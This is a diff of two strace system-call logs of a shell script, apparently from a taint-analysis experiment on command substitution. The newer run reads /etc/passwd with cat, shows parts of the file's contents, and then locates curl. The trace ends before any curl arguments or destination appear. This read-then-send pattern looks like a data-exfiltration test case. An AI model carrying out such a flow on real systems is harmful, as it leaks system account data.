@@ -1,11 +1,11 @@
-execve("/usr/bin/sh", ["sh", "cs.sh"], 0x7ffce606f360 /* 69 vars */) = 0
-brk(NULL)                               = 0x55580647c000
-arch_prctl(0x3001 /* ARCH_??? */, 0x7fff3deb2800) = -1 EINVAL (Invalid argument)
-mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fa8188ee000
+execve("/usr/bin/sh", ["sh", "cs.sh"], 0x7ffe25034340 /* 63 vars */) = 0
+brk(NULL)                               = 0x55f7ccd6f000
+arch_prctl(0x3001 /* ARCH_??? */, 0x7ffed4dd6260) = -1 EINVAL (Invalid argument)
+mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f0c14cd7000
 access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
 openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
-newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=62747, ...}, AT_EMPTY_PATH) = 0
-mmap(NULL, 62747, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fa8188de000
+newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=76099, ...}, AT_EMPTY_PATH) = 0
+mmap(NULL, 76099, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f0c14cc4000
 close(3)                                = 0
 openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
 read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0P\237\2\0\0\0\0\0"..., 832) = 832
@@ -14,32 +14,32 @@ pread64(3, "\4\0\0\0 \0\0\0\5\0\0\0GNU\0\2\0\0\300\4\0\0\0\3\0\0\0\0\0\0\0"..., 
 pread64(3, "\4\0\0\0\24\0\0\0\3\0\0\0GNU\0i8\235HZ\227\223\333\350s\360\352,\223\340."..., 68, 896) = 68
 newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=2216304, ...}, AT_EMPTY_PATH) = 0
 pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
-mmap(NULL, 2260560, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7fa8186b6000
-mmap(0x7fa8186de000, 1658880, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x28000) = 0x7fa8186de000
-mmap(0x7fa818873000, 360448, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1bd000) = 0x7fa818873000
-mmap(0x7fa8188cb000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x214000) = 0x7fa8188cb000
-mmap(0x7fa8188d1000, 52816, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7fa8188d1000
+mmap(NULL, 2260560, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f0c14a9c000
+mmap(0x7f0c14ac4000, 1658880, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x28000) = 0x7f0c14ac4000
+mmap(0x7f0c14c59000, 360448, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1bd000) = 0x7f0c14c59000
+mmap(0x7f0c14cb1000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x214000) = 0x7f0c14cb1000
+mmap(0x7f0c14cb7000, 52816, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f0c14cb7000
 close(3)                                = 0
-mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fa8186b3000
-arch_prctl(ARCH_SET_FS, 0x7fa8186b3740) = 0
-set_tid_address(0x7fa8186b3a10)         = 1044648
-set_robust_list(0x7fa8186b3a20, 24)     = 0
-rseq(0x7fa8186b40e0, 0x20, 0, 0x53053053) = 0
-mprotect(0x7fa8188cb000, 16384, PROT_READ) = 0
-mprotect(0x555805a08000, 8192, PROT_READ) = 0
-mprotect(0x7fa818928000, 8192, PROT_READ) = 0
+mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f0c14a99000
+arch_prctl(ARCH_SET_FS, 0x7f0c14a99740) = 0
+set_tid_address(0x7f0c14a99a10)         = 204977
+set_robust_list(0x7f0c14a99a20, 24)     = 0
+rseq(0x7f0c14a9a0e0, 0x20, 0, 0x53053053) = 0
+mprotect(0x7f0c14cb1000, 16384, PROT_READ) = 0
+mprotect(0x55f7cc18c000, 8192, PROT_READ) = 0
+mprotect(0x7f0c14d11000, 8192, PROT_READ) = 0
 prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
-munmap(0x7fa8188de000, 62747)           = 0
+munmap(0x7f0c14cc4000, 76099)           = 0
 getuid()                                = 1000
 getgid()                                = 1000
-getpid()                                = 1044648
-rt_sigaction(SIGCHLD, {sa_handler=0x5558059feaa0, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7fa8186f8520}, NULL, 8) = 0
+getpid()                                = 204977
+rt_sigaction(SIGCHLD, {sa_handler=0x55f7cc182aa0, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7f0c14ade520}, NULL, 8) = 0
 geteuid()                               = 1000
-getrandom("\xd2\x7d\x01\xdf\xc9\x31\x8c\x1c", 8, GRND_NONBLOCK) = 8
-brk(NULL)                               = 0x55580647c000
-brk(0x55580649d000)                     = 0x55580649d000
-getppid()                               = 1044645
-newfstatat(AT_FDCWD, "/home/ueno/tmp/cmdsbst", {st_mode=S_IFDIR|0775, st_size=4096, ...}, 0) = 0
+getrandom("\x7c\x42\xfb\xf8\xd0\x14\x99\x12", 8, GRND_NONBLOCK) = 8
+brk(NULL)                               = 0x55f7ccd6f000
+brk(0x55f7ccd90000)                     = 0x55f7ccd90000
+getppid()                               = 204974
+newfstatat(AT_FDCWD, "/home/ueno/dev/dta-sh/cmdsbst", {st_mode=S_IFDIR|0775, st_size=4096, ...}, 0) = 0
 newfstatat(AT_FDCWD, ".", {st_mode=S_IFDIR|0775, st_size=4096, ...}, 0) = 0
 openat(AT_FDCWD, "cs.sh", O_RDONLY)     = 3
 fcntl(3, F_DUPFD, 10)                   = 10
@@ -48,140 +48,922 @@ fcntl(10, F_SETFD, FD_CLOEXEC)          = 0
 geteuid()                               = 1000
 getegid()                               = 1000
 rt_sigaction(SIGINT, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
-rt_sigaction(SIGINT, {sa_handler=0x5558059feaa0, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7fa8186f8520}, NULL, 8) = 0
+rt_sigaction(SIGINT, {sa_handler=0x55f7cc182aa0, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7f0c14ade520}, NULL, 8) = 0
 rt_sigaction(SIGQUIT, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
-rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7fa8186f8520}, NULL, 8) = 0
+rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7f0c14ade520}, NULL, 8) = 0
 rt_sigaction(SIGTERM, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
-rt_sigaction(SIGTERM, {sa_handler=SIG_DFL, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7fa8186f8520}, NULL, 8) = 0
-read(10, "/bin/echo \"current directory $(/"..., 8192) = 42
+rt_sigaction(SIGTERM, {sa_handler=SIG_DFL, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7f0c14ade520}, NULL, 8) = 0
+read(10, "# /bin/echo \"current directory $"..., 8192) = 94
+read(10, "", 8192)                      = 0
 pipe2([3, 4], 0)                        = 0
-clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7fa8186b3a10) = 1044649
-strace: Process 1044649 attached
-[pid 1044648] close(4)                  = 0
-[pid 1044648] read(3,  <unfinished ...>
-[pid 1044649] set_robust_list(0x7fa8186b3a20, 24) = 0
-[pid 1044649] close(10)                 = 0
-[pid 1044649] close(3)                  = 0
-[pid 1044649] dup2(4, 1)                = 1
-[pid 1044649] close(4)                  = 0
-[pid 1044649] execve("/bin/pwd", ["/bin/pwd"], 0x55580647d148 /* 69 vars */) = 0
-[pid 1044649] brk(NULL)                 = 0x5571206de000
-[pid 1044649] arch_prctl(0x3001 /* ARCH_??? */, 0x7ffd9b54e8a0) = -1 EINVAL (Invalid argument)
-[pid 1044649] mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f37fe5c3000
-[pid 1044649] access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
-[pid 1044649] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
-[pid 1044649] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=62747, ...}, AT_EMPTY_PATH) = 0
-[pid 1044649] mmap(NULL, 62747, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f37fe5b3000
-[pid 1044649] close(3)                  = 0
-[pid 1044649] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
-[pid 1044649] read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0P\237\2\0\0\0\0\0"..., 832) = 832
-[pid 1044649] pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
-[pid 1044649] pread64(3, "\4\0\0\0 \0\0\0\5\0\0\0GNU\0\2\0\0\300\4\0\0\0\3\0\0\0\0\0\0\0"..., 48, 848) = 48
-[pid 1044649] pread64(3, "\4\0\0\0\24\0\0\0\3\0\0\0GNU\0i8\235HZ\227\223\333\350s\360\352,\223\340."..., 68, 896) = 68
-[pid 1044649] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=2216304, ...}, AT_EMPTY_PATH) = 0
-[pid 1044649] pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
-[pid 1044649] mmap(NULL, 2260560, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f37fe38b000
-[pid 1044649] mmap(0x7f37fe3b3000, 1658880, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x28000) = 0x7f37fe3b3000
-[pid 1044649] mmap(0x7f37fe548000, 360448, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1bd000) = 0x7f37fe548000
-[pid 1044649] mmap(0x7f37fe5a0000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x214000) = 0x7f37fe5a0000
-[pid 1044649] mmap(0x7f37fe5a6000, 52816, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f37fe5a6000
-[pid 1044649] close(3)                  = 0
-[pid 1044649] mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f37fe388000
-[pid 1044649] arch_prctl(ARCH_SET_FS, 0x7f37fe388740) = 0
-[pid 1044649] set_tid_address(0x7f37fe388a10) = 1044649
-[pid 1044649] set_robust_list(0x7f37fe388a20, 24) = 0
-[pid 1044649] rseq(0x7f37fe3890e0, 0x20, 0, 0x53053053) = 0
-[pid 1044649] mprotect(0x7f37fe5a0000, 16384, PROT_READ) = 0
-[pid 1044649] mprotect(0x55711e874000, 4096, PROT_READ) = 0
-[pid 1044649] mprotect(0x7f37fe5fd000, 8192, PROT_READ) = 0
-[pid 1044649] prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
-[pid 1044649] munmap(0x7f37fe5b3000, 62747) = 0
-[pid 1044649] getrandom("\xa6\x93\x1c\xf8\x2a\x81\xba\x98", 8, GRND_NONBLOCK) = 8
-[pid 1044649] brk(NULL)                 = 0x5571206de000
-[pid 1044649] brk(0x5571206ff000)       = 0x5571206ff000
-[pid 1044649] openat(AT_FDCWD, "/usr/lib/locale/locale-archive", O_RDONLY|O_CLOEXEC) = 3
-[pid 1044649] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=6784496, ...}, AT_EMPTY_PATH) = 0
-[pid 1044649] mmap(NULL, 6784496, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f37fdd0f000
-[pid 1044649] close(3)                  = 0
-[pid 1044649] getcwd("/home/ueno/tmp/cmdsbst", 4096) = 23
-[pid 1044649] newfstatat(1, "", {st_mode=S_IFIFO|0600, st_size=0, ...}, AT_EMPTY_PATH) = 0
-[pid 1044649] write(1, "/home/ueno/tmp/cmdsbst\n", 23) = 23
-[pid 1044648] <... read resumed>"/home/ueno/tmp/cmdsbst\n", 128) = 23
-[pid 1044649] close(1 <unfinished ...>
-[pid 1044648] read(3,  <unfinished ...>
-[pid 1044649] <... close resumed>)      = 0
-[pid 1044648] <... read resumed>"", 128) = 0
-[pid 1044649] close(2 <unfinished ...>
-[pid 1044648] close(3 <unfinished ...>
-[pid 1044649] <... close resumed>)      = 0
-[pid 1044648] <... close resumed>)      = 0
-[pid 1044649] exit_group(0 <unfinished ...>
-[pid 1044648] wait4(-1,  <unfinished ...>
-[pid 1044649] <... exit_group resumed>) = ?
-[pid 1044649] +++ exited with 0 +++
-<... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 1044649
---- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=1044649, si_uid=1000, si_status=0, si_utime=0, si_stime=0} ---
-rt_sigreturn({mask=[]})                 = 1044649
-wait4(-1, 0x7fff3deb22ec, WNOHANG, NULL) = -1 ECHILD (No child processes)
+clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f0c14a99a10) = 204978
+close(4strace: Process 204978 attached
+)                                = 0
+[pid 204977] read(3,  <unfinished ...>
+[pid 204978] set_robust_list(0x7f0c14a99a20, 24) = 0
+[pid 204978] close(10)                  = 0
+[pid 204978] close(3)                   = 0
+[pid 204978] dup2(4, 1)                 = 1
+[pid 204978] close(4)                   = 0
+[pid 204978] newfstatat(AT_FDCWD, "/home/ueno/.miniconda3/bin/cat", 0x7ffed4dd5ca0, 0) = -1 ENOENT (No such file or directory)
+[pid 204978] newfstatat(AT_FDCWD, "/home/ueno/.nvm/versions/node/v18.9.0/bin/cat", 0x7ffed4dd5ca0, 0) = -1 ENOENT (No such file or directory)
+[pid 204978] newfstatat(AT_FDCWD, "/home/ueno/bin/cat", 0x7ffed4dd5ca0, 0) = -1 ENOENT (No such file or directory)
+[pid 204978] newfstatat(AT_FDCWD, "/usr/local/bin/cat", 0x7ffed4dd5ca0, 0) = -1 ENOENT (No such file or directory)
+[pid 204978] newfstatat(AT_FDCWD, "/usr/local/sbin/cat", 0x7ffed4dd5ca0, 0) = -1 ENOENT (No such file or directory)
+[pid 204978] newfstatat(AT_FDCWD, "/home/ueno/.cargo/bin/cat", 0x7ffed4dd5ca0, 0) = -1 ENOENT (No such file or directory)
+[pid 204978] newfstatat(AT_FDCWD, "/usr/sbin/cat", 0x7ffed4dd5ca0, 0) = -1 ENOENT (No such file or directory)
+[pid 204978] newfstatat(AT_FDCWD, "/usr/bin/cat", {st_mode=S_IFREG|0755, st_size=35280, ...}, 0) = 0
+[pid 204978] execve("/usr/bin/cat", ["cat", "/etc/passwd"], 0x55f7ccd70278 /* 63 vars */) = 0
+[pid 204978] brk(NULL)                  = 0x563aa7502000
+[pid 204978] arch_prctl(0x3001 /* ARCH_??? */, 0x7ffdffa8ef00) = -1 EINVAL (Invalid argument)
+[pid 204978] mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fce1b5dd000
+[pid 204978] access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+[pid 204978] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+[pid 204978] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=76099, ...}, AT_EMPTY_PATH) = 0
+[pid 204978] mmap(NULL, 76099, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fce1b5ca000
+[pid 204978] close(3)                   = 0
+[pid 204978] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+[pid 204978] read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0P\237\2\0\0\0\0\0"..., 832) = 832
+[pid 204978] pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
+[pid 204978] pread64(3, "\4\0\0\0 \0\0\0\5\0\0\0GNU\0\2\0\0\300\4\0\0\0\3\0\0\0\0\0\0\0"..., 48, 848) = 48
+[pid 204978] pread64(3, "\4\0\0\0\24\0\0\0\3\0\0\0GNU\0i8\235HZ\227\223\333\350s\360\352,\223\340."..., 68, 896) = 68
+[pid 204978] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=2216304, ...}, AT_EMPTY_PATH) = 0
+[pid 204978] pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
+[pid 204978] mmap(NULL, 2260560, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7fce1b3a2000
+[pid 204978] mmap(0x7fce1b3ca000, 1658880, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x28000) = 0x7fce1b3ca000
+[pid 204978] mmap(0x7fce1b55f000, 360448, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1bd000) = 0x7fce1b55f000
+[pid 204978] mmap(0x7fce1b5b7000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x214000) = 0x7fce1b5b7000
+[pid 204978] mmap(0x7fce1b5bd000, 52816, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7fce1b5bd000
+[pid 204978] close(3)                   = 0
+[pid 204978] mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fce1b39f000
+[pid 204978] arch_prctl(ARCH_SET_FS, 0x7fce1b39f740) = 0
+[pid 204978] set_tid_address(0x7fce1b39fa10) = 204978
+[pid 204978] set_robust_list(0x7fce1b39fa20, 24) = 0
+[pid 204978] rseq(0x7fce1b3a00e0, 0x20, 0, 0x53053053) = 0
+[pid 204978] mprotect(0x7fce1b5b7000, 16384, PROT_READ) = 0
+[pid 204978] mprotect(0x563aa6786000, 4096, PROT_READ) = 0
+[pid 204978] mprotect(0x7fce1b617000, 8192, PROT_READ) = 0
+[pid 204978] prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
+[pid 204978] munmap(0x7fce1b5ca000, 76099) = 0
+[pid 204978] getrandom("\xa2\x06\xf0\x6a\x7f\x0c\xb2\x1a", 8, GRND_NONBLOCK) = 8
+[pid 204978] brk(NULL)                  = 0x563aa7502000
+[pid 204978] brk(0x563aa7523000)        = 0x563aa7523000
+[pid 204978] openat(AT_FDCWD, "/usr/lib/locale/locale-archive", O_RDONLY|O_CLOEXEC) = 3
+[pid 204978] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=6784496, ...}, AT_EMPTY_PATH) = 0
+[pid 204978] mmap(NULL, 6784496, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fce1ad26000
+[pid 204978] close(3)                   = 0
+[pid 204978] newfstatat(1, "", {st_mode=S_IFIFO|0600, st_size=0, ...}, AT_EMPTY_PATH) = 0
+[pid 204978] openat(AT_FDCWD, "/etc/passwd", O_RDONLY) = 3
+[pid 204978] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=2929, ...}, AT_EMPTY_PATH) = 0
+[pid 204978] fadvise64(3, 0, 0, POSIX_FADV_SEQUENTIAL) = 0
+[pid 204978] mmap(NULL, 139264, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fce1ad04000
+[pid 204978] read(3, "root:x:0:0:root:/root:/bin/bash\n"..., 131072) = 2929
+[pid 204978] write(1, "root:x:0:0:root:/root:/bin/bash\n"..., 2929) = 2929
+[pid 204977] <... read resumed>"root:x:0:0:root:/root:/bin/bash\n"..., 128) = 128
+[pid 204978] read(3,  <unfinished ...>
+[pid 204977] read(3,  <unfinished ...>
+[pid 204978] <... read resumed>"", 131072) = 0
+[pid 204977] <... read resumed>"ys:/dev:/usr/sbin/nologin\nsync:x"..., 128) = 128
+[pid 204978] munmap(0x7fce1ad04000, 139264 <unfinished ...>
+[pid 204977] read(3, "/cache/man:/usr/sbin/nologin\nlp:"..., 128) = 128
+[pid 204978] <... munmap resumed>)      = 0
+[pid 204977] read(3,  <unfinished ...>
+[pid 204978] close(3 <unfinished ...>
+[pid 204977] <... read resumed>":news:/var/spool/news:/usr/sbin/"..., 128) = 128
+[pid 204978] <... close resumed>)       = 0
+[pid 204977] read(3, "ologin\nwww-data:x:33:33:www-data"..., 128) = 128
+[pid 204978] close(1 <unfinished ...>
+[pid 204977] read(3,  <unfinished ...>
+[pid 204978] <... close resumed>)       = 0
+[pid 204977] <... read resumed>"iling List Manager:/var/list:/us"..., 128) = 128
+[pid 204978] close(2 <unfinished ...>
+[pid 204977] read(3,  <unfinished ...>
+[pid 204978] <... close resumed>)       = 0
+[pid 204977] <... read resumed>"stem (admin):/var/lib/gnats:/usr"..., 128) = 128
+[pid 204978] exit_group(0 <unfinished ...>
+[pid 204977] read(3,  <unfinished ...>
+[pid 204978] <... exit_group resumed>)  = ?
+[pid 204977] <... read resumed>"02:systemd Network Management,,,"..., 128) = 128
+[pid 204977] read(3, "sbin/nologin\nmessagebus:x:102:10"..., 128) = 128
+[pid 204977] read(3, "n/systemd:/usr/sbin/nologin\nsysl"..., 128) = 128
+[pid 204977] read(3,  <unfinished ...>
+[pid 204978] +++ exited with 0 +++
+<... read resumed>"s:x:106:112:TPM software stack,,"..., 128) = 128
+--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=204978, si_uid=1000, si_status=0, si_utime=0, si_stime=0} ---
+rt_sigreturn({mask=[]})                 = 128
+read(3, "stemd Userspace OOM Killer,,,:/r"..., 128) = 128
+read(3, "10:119:Avahi autoip daemon,,,:/v"..., 128) = 128
+read(3, "n/nologin\ndnsmasq:x:112:65534:dn"..., 128) = 128
+read(3, "usr/sbin/nologin\navahi:x:114:121"..., 128) = 128
+read(3, "-pk-helper service,,,:/home/cups"..., 128) = 128
+read(3, "17:124::/nonexistent:/bin/false\n"..., 128) = 128
+read(3, "ech Dispatcher,,,:/run/speech-di"..., 128) = 128
+read(3, "sbin/nologin\nsaned:x:121:128::/v"..., 128) = 128
+read(3, "rd:/usr/sbin/nologin\ngeoclue:x:1"..., 128) = 128
+read(3, "sbin/nologin\ngnome-initial-setup"..., 128) = 128
+read(3, ":/bin/false\ngdm:x:127:133:Gnome "..., 128) = 128
+read(3, "esh:x:128:137:fwupd-refresh user"..., 128) = 113
+read(3, "", 128)                        = 0
+close(3)                                = 0
+wait4(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 204978
+wait4(-1, 0x7ffed4dd5d4c, WNOHANG, NULL) = -1 ECHILD (No child processes)
+newfstatat(AT_FDCWD, "/home/ueno/.miniconda3/bin/curl", 0x7ffed4dd5f50, 0) = -1 ENOENT (No such file or directory)
+newfstatat(AT_FDCWD, "/home/ueno/.nvm/versions/node/v18.9.0/bin/curl", 0x7ffed4dd5f50, 0) = -1 ENOENT (No such file or directory)
+newfstatat(AT_FDCWD, "/home/ueno/bin/curl", 0x7ffed4dd5f50, 0) = -1 ENOENT (No such file or directory)
+newfstatat(AT_FDCWD, "/usr/local/bin/curl", 0x7ffed4dd5f50, 0) = -1 ENOENT (No such file or directory)
+newfstatat(AT_FDCWD, "/usr/local/sbin/curl", 0x7ffed4dd5f50, 0) = -1 ENOENT (No such file or directory)
+newfstatat(AT_FDCWD, "/home/ueno/.cargo/bin/curl", 0x7ffed4dd5f50, 0) = -1 ENOENT (No such file or directory)
+newfstatat(AT_FDCWD, "/usr/sbin/curl", 0x7ffed4dd5f50, 0) = -1 ENOENT (No such file or directory)
+newfstatat(AT_FDCWD, "/usr/bin/curl", {st_mode=S_IFREG|0755, st_size=260328, ...}, 0) = 0
 rt_sigprocmask(SIG_SETMASK, ~[RTMIN RT_1], NULL, 8) = 0
-vfork(strace: Process 1044650 attached
+vfork(strace: Process 204979 attached
  <unfinished ...>
-[pid 1044650] rt_sigprocmask(SIG_SETMASK, [], ~[KILL STOP RTMIN RT_1], 8) = 0
-[pid 1044650] execve("/bin/echo", ["/bin/echo", "current directory /home/ueno/tmp"...], 0x55580647d148 /* 69 vars */ <unfinished ...>
-[pid 1044648] <... vfork resumed>)      = 1044650
-[pid 1044648] rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
-[pid 1044650] <... execve resumed>)     = 0
-[pid 1044648] <... rt_sigprocmask resumed>~[KILL STOP RTMIN RT_1], 8) = 0
-[pid 1044648] wait4(-1,  <unfinished ...>
-[pid 1044650] brk(NULL)                 = 0x5644b338e000
-[pid 1044650] arch_prctl(0x3001 /* ARCH_??? */, 0x7ffd88f81bc0) = -1 EINVAL (Invalid argument)
-[pid 1044650] mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f203c087000
-[pid 1044650] access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
-[pid 1044650] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
-[pid 1044650] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=62747, ...}, AT_EMPTY_PATH) = 0
-[pid 1044650] mmap(NULL, 62747, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f203c077000
-[pid 1044650] close(3)                  = 0
-[pid 1044650] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
-[pid 1044650] read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0P\237\2\0\0\0\0\0"..., 832) = 832
-[pid 1044650] pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
-[pid 1044650] pread64(3, "\4\0\0\0 \0\0\0\5\0\0\0GNU\0\2\0\0\300\4\0\0\0\3\0\0\0\0\0\0\0"..., 48, 848) = 48
-[pid 1044650] pread64(3, "\4\0\0\0\24\0\0\0\3\0\0\0GNU\0i8\235HZ\227\223\333\350s\360\352,\223\340."..., 68, 896) = 68
-[pid 1044650] newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=2216304, ...}, AT_EMPTY_PATH) = 0
-[pid 1044650] pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
-[pid 1044650] mmap(NULL, 2260560, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f203be4f000
-[pid 1044650] mmap(0x7f203be77000, 1658880, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x28000) = 0x7f203be77000
-[pid 1044650] mmap(0x7f203c00c000, 360448, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1bd000) = 0x7f203c00c000
-[pid 1044650] mmap(0x7f203c064000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x214000) = 0x7f203c064000
-[pid 1044650] mmap(0x7f203c06a000, 52816, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f203c06a000
-[pid 1044650] close(3)                  = 0
